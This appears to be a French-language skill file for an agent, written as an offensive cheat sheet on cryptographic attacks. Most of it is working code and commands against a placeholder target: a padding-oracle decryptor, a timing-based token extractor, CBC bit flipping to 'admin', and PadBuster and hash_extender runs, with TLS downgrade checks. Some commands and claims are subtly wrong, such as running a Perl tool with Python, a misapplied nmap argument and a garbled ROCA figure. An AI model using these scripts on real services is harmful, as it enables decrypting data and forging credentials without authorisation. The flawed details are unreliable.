---
name: crypto-attacks
description: Guide complet d'attaques cryptographiques — padding oracle, CBC bit flipping, hash length extension, timing attacks, ROCA, FREAK, LogJam, DROWN, outils.
category: cybersecurite
tags: [cryptography, crypto-attacks, padding-oracle, cbc, hash-length-extension, timing-attack, tls, ssl]
---

# Attaques Cryptographiques Avancées

## Sommaire
1. [Padding Oracle Attack](#padding-oracle-attack)
2. [CBC Bit Flipping](#cbc-bit-flipping)
3. [Hash Length Extension](#hash-length-extension)
4. [Timing Attacks](#timing-attacks)
5. [ROCA Attack (CVE-2017-15361)](#roca-attack)
6. [FREAK Attack (CVE-2015-0204)](#freak-attack)
7. [LogJam Attack (CVE-2015-4000)](#logjam-attack)
8. [DROWN Attack (CVE-2016-0800)](#drown-attack)
9. [Bleichenbacher Attack](#bleichenbacher-attack)
10. [Outils](#outils)

## Padding Oracle Attack

Exploite la différence de comportement du serveur entre un padding valide et invalide
pour déchiffrer des données CBC sans connaître la clé.

### Principe :
```
Ciphertext → Décryptage → Vérification padding → OK/Error
```
Si le serveur renvoie une erreur différente quand le padding est invalide → oracle.

### Détection :
```bash
# Modifier un byte du ciphertext
# Si 500 vs 200 → padding oracle probable
curl -X POST -d "data=MODIFIED_CIPHERTEXT" https://target.com/decrypt
```

### Avec padbuster :
```bash
# Installation
git clone https://github.com/AonCyberLabs/PadBuster.git
cd PadBuster

# Attaque basique
perl padBuster.pl https://target.com/endpoint "ENCRYPTED_DATA" 8 \
  -cookies "session=abc" \
  -encoding 0

# Avec IV (Initialization Vector)
perl padBuster.pl https://target.com/endpoint "ENCRYPTED_DATA" 8 \
  -iv IV_VALUE \
  -encoding 0
```

### Avec Python (manuel) :
```python
import requests
import base64

def padding_oracle(url, encrypted_b64, block_size=16):
    """Padding oracle attack - decrypt one block"""
    encrypted = base64.b64decode(encrypted_b64)
    blocks = [encrypted[i:i+block_size] for i in range(0, len(encrypted), block_size)]
    
    if len(blocks) < 2:
        blocks.insert(0, b'\x00' * block_size)
    
    # Décrypter block par block
    for block_num in range(len(blocks) - 1, 0, -1):
        D = [0] * block_size  # Valeurs décryptées intermédiaires
        P = [0] * block_size  # Plaintext final
        
        for pad in range(1, block_size + 1):
            for guess in range(256):
                crafted = bytearray(blocks[block_num - 1])
                for i in range(pad):
                    crafted[block_size - i - 1] = D[block_size - i - 1] ^ pad
                crafted[block_size - pad] = guess
                
                r = requests.post(url, data={
                    "data": base64.b64encode(bytes(crafted) + blocks[block_num]).decode()
                })
                
                if "valide" in r.text or r.status_code == 200:
                    D[block_size - pad] = guess ^ pad
                    P[block_size - pad] = D[block_size - pad] ^ blocks[block_num - 1][block_size - pad]
                    break
        print(f"Block {block_num}: {bytes(P)}")
```

## CBC Bit Flipping

Manipuler le ciphertext pour modifier le plaintext après déchiffrement.

### Principe :
En mode CBC, le plaintext du block N est XORé avec le ciphertext du block N-1.
Modifier un byte du ciphertext N-1 modifie le byte correspondant du plaintext N.

### Script Python :
```python
def cbc_bit_flip(ciphertext, block_num, byte_pos, original, target):
    """Flip bits dans CBC pour modifier le plaintext"""
    ct = bytearray(ciphertext)
    # Position du byte à modifier dans le ciphertext précédent
    pos = (block_num - 1) * 16 + byte_pos
    # Modifier : original XOR target XOR current
    ct[pos] = ct[pos] ^ original ^ target
    return bytes(ct)

# Exemple : changer "user=guest" en "user=admin"
# Original: ciphertext[16:32] = decrypt("admin") XOR ciphertext[0:16]
# Pour que plaintext devienne "admin", modifier ciphertext[0:16]
def flip_to_admin(ct, iv):
    ct = bytearray(ct)
    # "guest" (5 chars) → "admin" (5 chars), position 5
    for i in range(5):
        ct[5 + i] ^= ord('guest'[i]) ^ ord('admin'[i])
    return bytes(ct)
```

## Hash Length Extension

Permet de calculer H(message || padding || extension) sans connaître le secret.

### Vulnérable : MD5, SHA-1, SHA-256 (Merkle-Damgård construction)
### Résistant : SHA-3, Blake2, HMAC

### Avec hash_extender :
```bash
# Installation
git clone https://github.com/iagox86/hash_extender.git
cd hash_extender
make

# Attaque : on connaît H(secret || data), on calcule H(secret || data || padding || append)
./hash_extender --data "user=guest" \
                --secret 16 \
                --append "&user=admin" \
                --signature <hash_connu> \
                --format sha256
```

### Scénario classique (MAC de requête) :
```
# Connaissant :
#   hash = SHA256("secret" + "data")
#   data = "data"
#   secret_len = ? (brute-force 1-32)
# Calculer :
#   new_hash = SHA256("secret" + "data" + padding + "&admin=true")
```

## Timing Attacks

Exploite les différences de temps d'exécution pour extraire de l'information.

### Comparaison de chaînes (string comparison) :
```python
def timing_vulnerable_compare(a, b):
    """Vulnérable : s'arrête au premier mismatch"""
    for ca, cb in zip(a, b):
        if ca != cb:
            return False
    return True

# Exploitation : mesurer le temps pour chaque préfixe
```

### Test de timing :
```bash
#!/bin/bash
# Mesurer le temps de réponse pour chaque caractère
for c in {a..z} {0..9}; do
    start=$(date +%s%N)
    curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/verify?token=$c"
    end=$(date +%s%N)
    elapsed=$((end - start))
    echo "$c: $elapsed ns"
done
```

### Avec Python :
```python
import time
import requests

def timing_attack(url, param, charset="abcdef0123456789", max_len=32):
    """Extraction par timing d'un token"""
    known = ""
    for pos in range(max_len):
        best_char = ""
        best_time = 0
        
        for c in charset:
            test = known + c
            times = []
            
            for _ in range(10):
                start = time.time()
                r = requests.get(url, params={param: test.ljust(max_len, '0')})
                end = time.time()
                times.append(end - start)
            
            avg = sum(times) / len(times)
            
            if avg > best_time:
                best_time = avg
                best_char = c
        
        known += best_char
        print(f"[+] Position {pos}: '{best_char}' → {known}")
    
    return known
```

### Protections :
```python
import hmac

def secure_compare(a, b):
    """Constant-time comparison"""
    return hmac.compare_digest(a, b)
```

## ROCA Attack (CVE-2017-15361)

Vulnérabilité dans la génération de clés RSA de certaines bibliothèques (Infineon).

### Détection :
```bash
# Avec python-rsa
pip install roca-detect
python -m roca_detect public_key.pem

# Avec openssl
openssl rsa -pubin -in public.pem -RSAPublicKey_out -out pub.der 2>/dev/null
python3 -c "
from roca import check_key
print(check_key(open('pub.der','rb').read()))
"
```

### Impact : Facteur de 2^16 pour casser la clé → vulnérable jusqu'à 2048 bits.
### Correctif : Mettre à jour les bibliothèques de génération de clés.

## FREAK Attack (CVE-2015-0204)

**Factoring Attack on RSA-EXPORT Keys** — downgrade vers RSA export-grade (512 bits).

### Détection :
```bash
# Tester si le serveur accepte les cipher suites EXPORT
openssl s_client -connect target.com:443 -cipher EXPORT
```

### Script de test :
```bash
nmap --script ssl-enum-ciphers -p 443 target.com
openssl s_client -connect target.com:443 -cipher EXPORT-RSA
```

## LogJam Attack (CVE-2015-4000)

Downgrade vers Diffie-Hellman export-grade (512 bits).

### Détection :
```bash
nmap --script ssl-dh-params -p 443 target.com
openssl s_client -connect target.com:443 -cipher EXPORT-DH
```

### Test de la force DH :
```bash
# Vérifier la taille du paramètre DH
nmap -p 443 --script ssl-dh-params target.com
```

## DROWN Attack (CVE-2016-0800)

**Decrypting RSA with Obsolete and Weakened eNcryption** — utiliser SSLv2 pour
casser des connexions TLS.

### Détection :
```bash
# Tester si le serveur supporte SSLv2
nmap --script ssl-enum-ciphers -p 443 --script-args=tls.enable-heartbleed target.com
openssl s_client -connect target.com:443 -ssl2
```

### Impact : Toucher jusqu'à 33% des serveurs HTTPS en 2016.
### Correctif : Désactiver SSLv2 et ne pas partager les clés RSA entre serveurs.

## Bleichenbacher Attack

**Bleichenbacher's Million Message Attack** — attaque sur PKCS#1 v1.5 padding
dans RSA. Exploite un oracle de padding.

### Détection :
```bash
# Tester si le serveur distingue padding OK vs KO
curl -k -H "Content-Type: application/x-www-form-urlencoded" \
  -d "data=$(python3 -c 'import os; print(os.urandom(256).hex())')" \
  https://target.com/decrypt
# Différence de réponse → oracle possible
```

## Outils

### PadBuster (padding oracle) :
```bash
perl padBuster.pl https://target.com/endpoint "ENCRYPTED_DATA" 8 \
  -cookies "session=abc" \
  -encoding 0 \
  -noencode
```

### hash_extender :
```bash
./hash_extender --data "data" --secret 16 --append "&admin=1" \
  --signature <hash> --format sha256
```

### TLS test tools :
```bash
# testssl.sh
git clone https://github.com/drwetter/testssl.sh.git
./testssl.sh --full https://target.com

# O-Saft
git clone https://github.com/OWASP/O-Saft.git
python o-saft.pl --check https://target.com

# nmap scripts
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-dh-params -p 443 target.com
```

### Crypto attacks scripts :
```python
# Requirements : pycryptodome, cryptography
# CBC Bit flipping : cbc-bitflip-attack
# Hash length extension : hashpumpy
```

## Ressources
- **PortSwigger Padding Oracle** : https://portswigger.net/web-security/essential-skills/padding-oracle-attack
- **HackTricks Crypto Attacks** : https://book.hacktricks.xyz/cryptography
- **testssl.sh** : https://github.com/drwetter/testssl.sh
- **PadBuster** : https://github.com/AonCyberLabs/PadBuster
- **hash_extender** : https://github.com/iagox86/hash_extender
- **ROCA weak keys** : https://crocs.fi.muni.cz/public/papers/rsa_ccs17
- **Bleichenbacher Attack** : https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf